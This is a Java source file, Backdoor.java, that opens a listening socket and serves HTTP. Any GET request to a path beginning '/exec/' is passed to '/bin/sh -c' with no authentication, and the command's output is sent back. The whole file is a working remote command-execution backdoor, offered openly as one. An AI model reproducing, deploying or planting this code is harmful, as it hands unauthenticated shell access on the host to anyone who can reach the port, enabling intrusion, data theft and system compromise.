import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.URLDecoder;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

/**
 * @author kvivekanandan Feb 7, 2016 Backdoor.java
 */

public class Backdoor {

	private static final String OUTPUT_404 = "HTTP/1.1 404 Not Found";
	private static final String OUTPUT_HEADERS_200 = "HTTP/1.1 200 OK\r\n" + "Content-Type: text\r\n" + "Content-Length: ";
	private static final String OUTPUT_HEADERS_404 = "HTTP/1.1 404 Not Found\r\n\r\n";
	private static final String OUTPUT_END_OF_HEADERS = "\r\n\r\n";
	private int port;

	final ExecutorService clientProcessingPool = Executors.newFixedThreadPool(10);

	public Backdoor(int port) {
		this.port = port;
	}

	public void openConnection() throws IOException {

		ServerSocket serverSocket = new ServerSocket(port);
		try {
			while (true) {
				System.out.println("waiting:" + port);
				final Socket clientSocket = serverSocket.accept();
				clientProcessingPool.submit(new Runnable() {

					@Override
					public void run() {
						try {
							DataOutputStream out = new DataOutputStream(clientSocket.getOutputStream());
							BufferedReader in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));
							String input;
							boolean is200 = false;
							while ((input = in.readLine()) != null) {
								// System.out.println(input);
								String[] req = input.split(" ", 2);
								if (req != null && req.length >= 2) {
									if ("GET".equals(req[0])) {
										System.out.println(input);
										String command = URLDecoder.decode(req[1], "UTF-8");
										if (command.startsWith("/exec/")) {
											String urlcommand = command.replace("/exec/", "").trim();
											urlcommand = urlcommand.substring(0, urlcommand.lastIndexOf(' '));
											if (urlcommand != null && !urlcommand.isEmpty()) {
												// String command =
												// URLDecoder.decode(urlcommand,
												// "UTF-8");
												System.out.println(urlcommand);

												String[] cmd = { "/bin/sh", "-c", "" };
												cmd[2] = urlcommand;

												Runtime rt = Runtime.getRuntime();
												Process p = rt.exec(cmd);
												BufferedReader stdInput = new BufferedReader(new InputStreamReader(p.getInputStream()));
												BufferedReader stdError = new BufferedReader(new InputStreamReader(p.getErrorStream()));

												String s = null;
												StringBuffer output = new StringBuffer();
												while ((s = stdInput.readLine()) != null) {
													System.out.println(s);
													output = output.append(s).append("\n");
												}

												System.out.println("standard error:\n");
												while ((s = stdError.readLine()) != null) {
													System.out.println(s);
												}

												out.writeBytes(OUTPUT_HEADERS_200 + output.length() + OUTPUT_END_OF_HEADERS + output);
												is200 = true;
											}
										}
									}
								}
								if (input.isEmpty()) {
									break;
								}
							}
							if (!is200) {
								out.writeBytes(OUTPUT_HEADERS_404 + OUTPUT_404);
							}

							in.close();
							out.flush();
							out.close();
							// System.out.println("Request processed on " +
							// port);
						} catch (IOException e1) {
							e1.printStackTrace();
						}
					}
				});
			}
		} finally {
			if (serverSocket != null) {
				serverSocket.close();
			}
		}
	}

	public static void main(String[] args) {
		int portNumber = Integer.parseInt(args[0]);
		Backdoor backdoor = new Backdoor(portNumber);
		backdoor.run();
	}

	public void run() {
		try {
			openConnection();
		} catch (IOException e) {
			System.out.println(e.getMessage());
		}

	}
}
